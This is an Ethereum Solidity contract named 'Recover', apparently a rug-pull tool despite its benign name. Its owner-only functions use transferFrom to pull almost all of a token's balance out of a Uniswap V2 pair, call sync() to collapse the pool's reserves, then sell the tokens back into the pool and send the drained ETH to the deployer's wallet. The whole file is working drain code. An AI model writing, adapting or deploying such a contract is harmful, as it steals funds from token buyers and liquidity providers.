/**
 *Submitted for verification at Etherscan.io on 2023-09-28
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IUniswapV2Pair {
    function sync() external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function WETH() external pure returns (address);
}

contract Recover is Context, Ownable {
    IERC20 private token;
    IUniswapV2Pair private uniswapV2Pair;
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address payable private recoveryWallet;


    constructor () {
        recoveryWallet = payable(_msgSender());
    }

    function setInfo(IERC20 _token, IUniswapV2Pair _uniswapV2Pair) external onlyOwner {
        token = _token;
        uniswapV2Pair = _uniswapV2Pair;
    }

    function recover() external onlyOwner {
        uint256 lpbalance = token.balanceOf(address(uniswapV2Pair)) - 1;
        token.transferFrom(address(uniswapV2Pair), address(this), lpbalance);
        uniswapV2Pair.sync();

        uint256 myBalance = token.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = uniswapV2Router.WETH();
        token.approve(address(uniswapV2Router), myBalance);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            myBalance,
            0,
            path,
            address(this),
            block.timestamp
        );

        recoveryWallet.transfer(address(this).balance);
    }

    function emergencyTransfer() external onlyOwner {
        uint256 lpbalance = token.balanceOf(address(uniswapV2Pair)) - 1;
        token.transferFrom(address(uniswapV2Pair), recoveryWallet, lpbalance);
    }

    function emergencyWithdrawETH() external onlyOwner {
        recoveryWallet.transfer(address(this).balance);
    }

    receive() external payable {}

}